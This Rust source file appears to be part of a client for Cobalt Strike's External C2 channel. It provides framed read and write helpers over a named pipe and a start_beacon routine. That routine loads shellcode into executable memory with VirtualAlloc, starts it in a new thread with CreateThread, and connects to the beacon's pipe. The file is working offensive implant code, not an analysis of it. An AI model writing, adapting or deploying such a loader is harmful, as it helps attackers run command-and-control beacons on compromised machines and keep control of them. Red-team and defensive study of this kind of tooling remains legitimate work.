//! Pure-Rust port of beacon.c – a quick client for Cobalt Strike's External C2
//! server.  Uses raw Windows API calls via the `windows` crate instead of a
//! separate C DLL.

use std::ffi::c_void;
use std::ptr;
use std::thread;
use std::time::Duration;

use windows::core::PCSTR;
use windows::Win32::Foundation::{GENERIC_READ, GENERIC_WRITE, HANDLE, INVALID_HANDLE_VALUE};
use windows::Win32::Storage::FileSystem::{
    CreateFileA, ReadFile, WriteFile, OPEN_EXISTING, FILE_FLAGS_AND_ATTRIBUTES,
};
use windows::Win32::System::Memory::{VirtualAlloc, MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use windows::Win32::System::Pipes::PeekNamedPipe;
use windows::Win32::System::Threading::CreateThread;

// These constants are not always exported by the windows crate; define them manually.
// SECURITY_SQOS_PRESENT = 0x00100000
// SECURITY_ANONYMOUS    = 0x00000000  (SE_ANONYMOUS_LOGON_LEVEL)
const SECURITY_SQOS_PRESENT: u32 = 0x0010_0000;
const SECURITY_ANONYMOUS: u32 = 0x0000_0000;

use crate::config;

// ---------------------------------------------------------------------------
// read_frame  –  read a length-prefixed frame from a HANDLE
// ---------------------------------------------------------------------------

/// Non-blocking read of a length-prefixed frame from `my_handle`.
///
/// Uses `PeekNamedPipe` to check if data is available on the pipe.
/// If no data is available, returns an empty `Vec` immediately without blocking.
/// Otherwise reads the 4-byte little-endian length prefix followed by that many
/// bytes of payload.
pub fn read_frame(my_handle: HANDLE) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    // 0. Non-blocking check: peek to see if any data is available
    let mut bytes_available: u32 = 0;
    let peek_ok = unsafe {
        PeekNamedPipe(
            my_handle,
            None,                       // lpBuffer (don't read data, just peek)
            0,                          // nBufferSize
            None,                       // lpBytesRead
            Some(&mut bytes_available), // lpTotalBytesAvail
            None,                       // lpBytesLeftThisMessage
        )
    };
    if let Err(e) = peek_ok {
        return Err(format!("PeekNamedPipe failed: {e}").into());
    }

    // No data available – return empty buffer immediately
    if bytes_available == 0 {
        return Ok(Vec::new());
    }

    // 1. Read the 4-byte length header
    let mut size_buf = [0u8; 4];
    let mut bytes_read: u32 = 0;

    let ok = unsafe {
        ReadFile(
            my_handle,
            Some(&mut size_buf),
            Some(&mut bytes_read),
            None,
        )
    };
    if let Err(e) = ok {
        return Err(format!("ReadFile (size header) failed: {e}").into());
    }

    let size = u32::from_le_bytes(size_buf) as usize;
    if size == 0 {
        return Ok(Vec::new());
    }

    // 2. Read the payload in a loop
    let mut buffer = vec![0u8; size];
    let mut total: usize = 0;

    while total < size {
        let mut temp: u32 = 0;
        let ok = unsafe {
            ReadFile(
                my_handle,
                Some(&mut buffer[total..]),
                Some(&mut temp),
                None,
            )
        };
        if let Err(e) = ok {
            return Err(format!("ReadFile (payload) failed: {e}").into());
        }
        total += temp as usize;
    }

    Ok(buffer)
}

// ---------------------------------------------------------------------------
// write_frame  –  write a length-prefixed frame to a HANDLE
// ---------------------------------------------------------------------------

/// Writes a 4-byte little-endian length prefix followed by `buffer` to
/// `my_handle`.  Returns the number of payload bytes written.
pub fn write_frame(my_handle: HANDLE, buffer: &[u8]) -> Result<u32, Box<dyn std::error::Error>> {
    let length = buffer.len() as u32;
    let mut wrote: u32 = 0;

    // Write the 4-byte length header
    let len_bytes = length.to_le_bytes();
    let ok = unsafe {
        WriteFile(
            my_handle,
            Some(&len_bytes),
            Some(&mut wrote),
            None,
        )
    };
    if let Err(e) = ok {
        return Err(format!("WriteFile (length header) failed: {e}").into());
    }

    // Write the payload
    wrote = 0;
    let ok = unsafe {
        WriteFile(
            my_handle,
            Some(buffer),
            Some(&mut wrote),
            None,
        )
    };
    if let Err(e) = ok {
        return Err(format!("WriteFile (payload) failed: {e}").into());
    }

    Ok(wrote)
}

// ---------------------------------------------------------------------------
// start_beacon  –  inject shellcode & return a named-pipe handle
// ---------------------------------------------------------------------------

/// Allocates RWX memory, copies `payload` into it, launches it in a new
/// thread, then connects to the named pipe defined by `PIPE_NAME` and returns
/// the pipe handle.
pub fn start_beacon(payload: &[u8]) -> Result<HANDLE, Box<dyn std::error::Error>> {
    let length = payload.len();

    // VirtualAlloc – PAGE_EXECUTE_READWRITE
    let mem = unsafe {
        VirtualAlloc(
            Some(ptr::null()),
            length,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        )
    };
    if mem.is_null() {
        return Err("VirtualAlloc returned NULL".into());
    }

    // memcpy
    unsafe {
        ptr::copy_nonoverlapping(payload.as_ptr(), mem as *mut u8, length);
    }
    println!("[+] beacon: Injecting code, {} bytes", length);

    // CreateThread – entry point is the shellcode
    type ThreadProc = unsafe extern "system" fn(*mut c_void) -> u32;
    let entry: ThreadProc = unsafe { std::mem::transmute(mem) };

    unsafe {
        CreateThread(
            None,                       // lpThreadAttributes
            0,                          // dwStackSize (default)
            Some(entry),                // lpStartAddress
            Some(ptr::null()),          // lpParameter
            Default::default(),         // dwCreationFlags (0 = run immediately)
            None,                       // lpThreadId
        )?;
    }

    // Connect to the beacon named pipe
    println!("[+] beacon: Connecting to named pipe");
    // Build a null-terminated byte string from the PIPE_NAME constant
    let mut pipe_name_bytes = config::PIPE_NAME.as_bytes().to_vec();
    pipe_name_bytes.push(0); // null terminator for PCSTR

    let mut handle_beacon = INVALID_HANDLE_VALUE;
    while handle_beacon == INVALID_HANDLE_VALUE {
        let result = unsafe {
            CreateFileA(
                PCSTR::from_raw(pipe_name_bytes.as_ptr()),
                (GENERIC_READ.0 | GENERIC_WRITE.0).into(),
                Default::default(),                         // dwShareMode = 0
                None,                                       // lpSecurityAttributes
                OPEN_EXISTING,
                FILE_FLAGS_AND_ATTRIBUTES(SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS),
                None,                                       // hTemplateFile
            )
        };

        match result {
            Ok(h) => {
                handle_beacon = h;
            }
            Err(_) => {
                // Pipe not ready yet – keep trying (mirrors the C busy-loop)
                thread::sleep(Duration::from_millis(100));
            }
        }
    }

    Ok(handle_beacon)
}
